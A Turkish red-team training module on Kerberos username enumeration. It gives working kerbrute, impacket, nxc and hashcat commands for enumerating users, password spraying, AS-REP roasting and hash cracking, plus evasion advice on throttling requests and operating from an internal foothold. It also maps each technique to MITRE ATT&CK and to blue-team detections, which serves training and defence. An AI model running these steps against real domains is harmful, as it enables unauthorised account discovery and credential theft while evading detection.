## 1. Kavramsal Temel — Neden Var?

Password spraying ([02.2](./02.2_Password_Spraying.md)) için **geçerli kullanıcı listesine** ihtiyaç var. Ama LDAP enumerasyonu ([01.1](../Modul_01_Kesif_ve_Numaralandirma/01.1_LDAP_Enumerasyonu.md)) bir kimlik gerektirir — henüz yoksa? İşte Kerberos'un bir yan etkisi imdada yetişir:

> **Kerberos ön kimlik doğrulaması (pre-authentication), var olan bir kullanıcı ile var olmayan bir kullanıcıya FARKLI hata kodları döndürür. Bu fark, kimlik olmadan geçerli kullanıcı adlarını "damıtmayı" mümkün kılar — üstelik başarısız parola denemesi (badPwdCount) üretmeden.**

`kerbrute` bu farkı sömürür: bir AS-REQ gönderir, DC'nin verdiği hata koduna bakar. `KDC_ERR_C_PRINCIPAL_UNKNOWN` = kullanıcı yok; `KDC_ERR_PREAUTH_REQUIRED` = **kullanıcı var** (parola bile denemeden!). Böylece bir kelime listesinden gerçek hesapları ayıklar, sonra aynı araçla güvenli spray yapar.

**Analoji:** Bir binada isim listesi denemek gibi. Kapı zilinde var olmayan bir isme "böyle biri yok" der; var olana "parola gerekli" der. Sen daha kapıyı çalmadan kimlerin orada oturduğunu öğrenirsin.

## 2. Teknik Derinlik — AS-REQ Pre-Auth Yan Kanalı

### 2.1 Hata kodu farkı (username enumeration)

```
   kerbrute userenum:  her isim için minimal AS-REQ (pre-auth verisiz)
   ┌────────────────────────────────────────────────────────────┐
   │ İsim yok        → KDC_ERR_C_PRINCIPAL_UNKNOWN   (kod 6)     │
   │ İsim VAR        → KDC_ERR_PREAUTH_REQUIRED      (kod 25) ✔  │  ← geçerli kullanıcı
   │ İsim var + preauth KAPALI → AS-REP DÖNER (hash!) → AS-REP roast │  ← bonus, Modül 03
   └────────────────────────────────────────────────────────────┘
```

> **Kritik OPSEC avantajı:** `userenum` **parola denemez** → `badPwdCount` artmaz → **hesap kilitlenmez** ve 4625 üretmez. Yalnızca 4768 (TGT istek) loglanır, o da normal trafiğe benzer. Bu yüzden enum, spray'den çok daha sessizdir.

### 2.2 Bonus: preauth-kapalı hesaplar (AS-REP)

Bir kullanıcının `DONT_REQ_PREAUTH` ([01.1](../Modul_01_Kesif_ve_Numaralandirma/01.1_LDAP_Enumerasyonu.md)) biti açıksa, `userenum` sırasında DC pre-auth istemeden **doğrudan AS-REP** döner — içinde o kullanıcının parolasıyla şifrelenmiş blob → **AS-REP Roasting** ([Modül 03.1](../Modul_03_Kimlik_Bilgisi_Erisimi/)). Yani enum sırasında bedava kırılabilir hash düşebilir.

### 2.3 AS-REQ paketi — alan seviyesinde

`kerbrute userenum` minimal bir **AS-REQ** yollar. İlgili alanlar:

```
AS-REQ ::= KDC-REQ {
   pvno         : 5
   msg-type     : 10 (KRB_AS_REQ)
   req-body {
     cname      : PrincipalName  → DENENEN KULLANICI ADI  (enum'un anahtarı)
     realm      : "CORP.LOCAL"
     sname      : krbtgt/CORP.LOCAL
     etype      : [23, 17, 18]   → istenen şifreleme türleri (RC4/AES)
     -- padata (PA-ENC-TIMESTAMP) YOK → "önce parolayı kanıtla" adımını atla
   }
}
```

DC yanıtı `cname`'in var olup olmamasına göre dallanır (KDC_ERR_C_PRINCIPAL_UNKNOWN vs. PREAUTH_REQUIRED). Parola içeren `PA-ENC-TIMESTAMP` **hiç gönderilmediği** için `badPwdCount` artmaz — enum'un kilitlemesiz olmasının teknik sebebi budur.

### 2.4 İsim listesi kaynakları ve üretimi

```
   users.txt üretimi:
   - OSINT: LinkedIn → ad.soyad formatı (jsmith, john.smith, smithj)
   - Sızmış veritabanları (breach) → e-posta yerel kısmı
   - Şirket e-posta formatı tahmini (username-anarchy aracı)
   - SecLists/Names/*  jsmith gibi yaygın kombinasyonlar
```

```bash
# İsim listesinden tüm olası kullanıcı adı formatlarını türet
username-anarchy -i firstlast.txt > candidates.txt   # jsmith, john.smith, smithj, j.smith...
```

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Kerbrute — kullanıcı enumerasyonu

```bash
# İsim listesinden geçerli kullanıcıları damıt (parola YOK, kilitlenme YOK)
kerbrute userenum -d corp.local --dc 10.10.10.5 users.txt
```

**Örnek çıktı:**
```
[+] VALID USERNAME:  jsmith@corp.local
[+] VALID USERNAME:  mjones@corp.local
[+] VALID USERNAME:  svc-backup@corp.local
[+] svc-backup has no pre-auth required! AS-REP: $krb5asrep$23$svc-backup@... ← AS-REP roast!
```

### 3.2 Kerbrute — güvenli spray (enum'dan gelen listeyle)

```bash
# Damıtılan gerçek kullanıcılara tek parola dene (--safe = kilitlenmeye yaklaşınca dur)
kerbrute passwordspray -d corp.local --dc 10.10.10.5 valid_users.txt 'Welcome1' --safe

# Kombine: bruteuser (tek kullanıcı, çok parola — kilitleme riskine dikkat)
kerbrute bruteuser -d corp.local --dc 10.10.10.5 passwords.txt jsmith
```

### 3.3 Alternatif araçlar (çapraz-doğrulama)

```bash
# Impacket ile aynı AS-REP enum (preauth-kapalı hesapları hash'le döker)
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.5 -no-pass -format hashcat

# nxc ile kullanıcı doğrulama (kimlik gerektirir ama --users ile enum)
nxc smb 10.10.10.5 -u '' -p '' --users        # null session açıksa
```

### 3.4 Yakalanan AS-REP'i kır

```bash
hashcat -m 18200 asrep_hashes.txt rockyou.txt -r rules/best64.rule
# mode 18200 = Kerberos AS-REP (etype 23/RC4)
```

### 3.5 Enum sonrası doğrudan kimlik doğrulama testi

```bash
# Geçerli kullanıcı + bulunan parola ile TGT al (foothold doğrulama)
impacket-getTGT corp.local/mjones:'Welcome1' -dc-ip 10.10.10.5
export KRB5CCNAME=mjones.ccache
nxc smb 10.10.10.5 -u mjones -k --use-kcache        # bilet ile kimlik doğrula
```

### 3.6 Gerçek-dünya zincir örneği

```
   1) OSINT (LinkedIn) → 450 isim → username-anarchy → 1800 aday
   2) kerbrute userenum → 310 geçerli + 2 AS-REP hash (preauth kapalı) düştü
   3) AS-REP hash → hashcat -m 18200 → svc-legacy:Password123 kırıldı
   4) 310 geçerli kullanıcı → kerbrute passwordspray 'Sirket2024!' --safe → 3 isabet
   5) Kimlikler → 01.1 LDAP enum → Kerberoast/ACL yolu → sömürü modülleri
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| Kerberos user enum | **T1087.002** (Account Discovery) | Kısa sürede çok sayıda 4768; çoğu başarısız pre-auth | [Blue 02.1 — 4768 hacim anomalisi](../../2-Blue_Team/Modul_02_SIEM_ve_Tespit_Muhendisligi/02.1_Kritik_Event_ID_Katalogu.md) |
| Kerberos spray | **T1110.003** | 4768 + 4771 dağınık hesaplarda | [Blue 02.2 — Sigma](../../2-Blue_Team/Modul_02_SIEM_ve_Tespit_Muhendisligi/02.2_Sigma_Elastic_Splunk_Kural_Yazimi.md) |
| AS-REP roast (enum yan ürünü) | **T1558.004** (AS-REP Roasting) | 4768 with `PreAuthType=0`, etype 23 (RC4) | [Blue 02.3 — AS-REP tespiti](../../2-Blue_Team/Modul_02_SIEM_ve_Tespit_Muhendisligi/02.3_Kerberoasting_AS_REP_Tespiti.md) |

**OPSEC notları:**
- **`userenum` parola denemez** → kilitleme riski sıfır, iz minimal. Enum'u spray'den ayrı ve önce yap; asla ham/geniş listeyi doğrudan spray etme (hem yavaş hem gürültülü).
- **Hız = tespit.** Saniyede yüzlerce AS-REQ, 4768 hacminde ani zirve yapar. `kerbrute --delay <ms>` ile yavaşlat; büyük listeyi saatlere yay. Modern SIEM'ler "tek kaynaktan kısa sürede N farklı `cname`" desenini yakalar.
- **Kaynak konumu:** Dıştan (internet) enum, perimetre loglarında öne çıkar; iç foothold'dan çalışırsan 4768 kaynağı meşru bir iç makine görünür → gürültü içinde erir.
- 4768'lerin ani hacim artışı tek IOC'dir. İstekleri **yavaşlat** (`--delay`) ve iç bir foothold'dan çalış → kaynak IP iç makine görünür.
- **etype 23 (RC4)** AS-REP talebi savunmacı için kırmızı bayraktır — modern ortamlar AES zorlar ([Blue 06.3](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.3_AES_Zorlama_RC4_ve_PAC.md)). Sen RC4 istersin (kırması kolay) ama bu seni ele verir; dengeyi bil.
- `DONT_REQ_PREAUTH` bir hesapta açıksa bu **yanlış yapılandırmadır**; savunmacı bunu düzeltmişse AS-REP damarı kurur — o zaman Kerberoast ([Modül 03](../Modul_03_Kimlik_Bilgisi_Erisimi/)) ana yol olur.
